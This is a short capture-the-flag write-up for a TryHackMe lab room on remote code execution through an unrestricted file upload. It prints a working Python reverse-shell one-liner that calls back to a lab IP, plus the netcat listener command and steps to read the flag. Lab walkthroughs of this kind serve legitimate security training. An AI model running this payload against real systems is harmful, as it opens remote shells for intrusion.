# URL
https://tryhackme.com/room/lafb2026e4

# Concept
To Understand how Remote Code Execution Vulnerability works and how can we exploit it using a reverse shell

# Method of Solve
- Start the attack box or connect using openvpn
- Start Burpsuite and look for all the endpoints or explore all the endpoints and look for all the Contents and requests type in the endpoints
- Read the description and proceed accordingly
- Now we will look for methods and content-type supported in burp and we can see that any content type can be used for uploads
- So now we will try to get a reverse shell using Remote code Execution
  ```
    import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.232.164",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])
  ```
- This is the code we will use for obtaining a reverse shell
- First lets start nc at the specified port
  ```
    nc -lvnp 4444
  ```
- Now lets upload the code in the website
- We will get a interactive reverse shell
- now lets see who we are using whoami command
- Finally perform ls and cat the flag
  ```
    ls
    cat flag.txt
  ```
- We will get the flag

## This Concludes the EP 04 of the PATH.
